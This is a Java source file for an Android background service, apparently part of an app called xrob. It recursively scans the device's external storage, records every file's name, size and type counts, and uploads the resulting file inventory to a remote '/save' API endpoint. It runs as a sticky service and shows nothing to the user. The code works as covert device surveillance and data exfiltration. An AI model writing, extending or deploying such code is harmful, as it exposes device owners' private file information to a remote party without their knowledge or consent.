package com.theah64.xrob.services;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

public class FileWalkerService extends Service {

    public static final String KEY_PATH_TO_WALK = "path_to_walk";

    private static class FileWalker {

        private static final String KEY_UNKNOWN_FILES = "unknown_files";
        private static final String KEY_DIRECTORY = "directory";

        private final Map<String, Integer> status = new HashMap<>();

        private static final String KEY_FILES = "files";
        private static final String KEY_SIZE = "size";
        private static final String KEY_NAME = "name";

        private final File root;

        FileWalker(String root) {
            this(new File(root));
        }

        FileWalker(File root) {
            this.root = root;
        }

        JSONArray walk() throws JSONException {
            return read(scan(this.root));
        }

        //TODO: Method not completed - extension must be treated carefully.
        String getStatus() {
            final StringBuilder sb = new StringBuilder();
            for (Map.Entry<String, Integer> entry : status.entrySet()) {
                sb.append(entry.getKey()).append("=").append("<b>").append(entry.getValue()).append("</b></br>");
            }
            return sb.toString();
        }

        static class FileNode {

            private final String name;
            private final List<FileNode> files;
            private final long sizeInKb;

            FileNode(String name, List<FileNode> files, long sizeInKb) {
                this.name = name;
                this.files = files;
                this.sizeInKb = sizeInKb;
            }

            public String getName() {
                return name;
            }

            List<FileNode> getFiles() {
                return files;
            }

            long getSizeInKb() {
                return sizeInKb;
            }
        }

        private static JSONArray read(List<FileNode> fileNodes) throws JSONException {
            if (fileNodes != null) {
                final JSONArray jaFiles = new JSONArray();
                for (final FileNode fn : fileNodes) {
                    final JSONObject joFn = new JSONObject();
                    if (fn.getFiles() != null) {
                        joFn.put(KEY_FILES, read(fn.getFiles()));
                    }
                    joFn.put(KEY_SIZE, fn.getSizeInKb());
                    joFn.put(KEY_NAME, fn.getName());
                    jaFiles.put(joFn);
                }
                return jaFiles;
            }
            return null;
        }

        private List<FileNode> scan(File root) {

            manageStatus(root);

            if (root.isDirectory()) {
                final List<FileNode> rootFileNodes = new ArrayList<>();

                for (final File file : root.listFiles()) {
                    manageStatus(file);
                    rootFileNodes.add(new FileNode(file.getName(), scan(file), (file.length() / 1024)));
                }

                return rootFileNodes;

            }

            return null;
        }

        /**
         * Method used to count number of directories, files, file_type and their count.
         *
         * @param file
         */
        private void manageStatus(File file) {

            String extension;
            if (!file.isDirectory()) {

                final String fileName = file.getName();

                if (fileName.contains(".")) {
                    final String[] dotParts = fileName.split("\\.");
                    extension = dotParts[dotParts.length - 1];
                } else {
                    extension = KEY_UNKNOWN_FILES;
                }

            } else {
                extension = KEY_DIRECTORY;
            }

            if (!status.containsKey(extension)) {
                status.put(extension, 1);
            } else {
                status.put(extension, status.get(extension) + 1);
            }

        }
    }

    public FileWalkerService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        //Collections.reverse(fileNodes);
        Log.d("X", "File walker started");

        String pathToSync = null;

        if (intent != null) {
            pathToSync = intent.getStringExtra(KEY_PATH_TO_WALK);
        }

        if (pathToSync == null) {
            pathToSync = Environment.getExternalStorageDirectory().toString();
        }

        try {
            final FileWalker fileWalker = new FileWalker(pathToSync);
            final JSONArray jaFiles = fileWalker.walk();
            new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKey) {

                    //Building request
                    assert jaFiles != null;
                    final Request contactsRequest = new APIRequestBuilder("/save", apiKey)
                            .addParam(Xrob.KEY_ERROR, "false")
                            .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_FILES)
                            .addParam(Xrob.KEY_MESSAGE, fileWalker.getStatus())
                            .addParam(Xrob.KEY_DATA, jaFiles.toString())
                            .build();


                    OkHttpUtils.getInstance().getClient().newCall(contactsRequest).enqueue(new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {
                            e.printStackTrace();
                        }

                        @Override
                        public void onResponse(Call call, Response response) throws IOException {

                            try {

                                new APIResponse(OkHttpUtils.logAndGetStringBody(response));

                            } catch (JSONException | APIResponse.APIException e) {
                                e.printStackTrace();
                            }
                        }
                    });

                }

                @Override
                public void onFailed(String reason) {

                }
            });
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

}
